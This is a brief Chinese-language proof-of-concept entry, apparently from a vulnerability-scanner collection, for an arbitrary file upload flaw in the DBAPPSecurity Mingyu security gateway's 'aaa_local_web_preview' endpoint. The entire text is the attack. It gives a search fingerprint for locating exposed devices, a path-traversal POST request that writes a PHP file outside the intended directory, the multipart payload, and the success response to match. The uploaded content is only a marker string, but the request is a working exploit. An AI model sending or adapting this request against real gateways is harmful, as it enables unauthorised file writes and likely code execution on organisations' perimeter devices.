# 安恒明御安全网关aaa_local_web_preview任意文件上传

安恒明御安全网关aaa_local_web_preview ｜ 文件上传 ｜ —
- **指纹**：`title=="明御安全网关"`
- **请求**：`POST /webui/?g=aaa_local_web_preview&name=123&read=0&suffix=/../../../dudesuite.php HTTP/1.1`

**Payload**
```
--849978f98abe41119122148e4aa65b1a
Content-Disposition: form-data; name="123"; filename="dudesuite.php"
Content-Type: text/plain
dudesuite
--849978f98abe41119122148e4aa65b1a--
```
- **响应特征**：200 success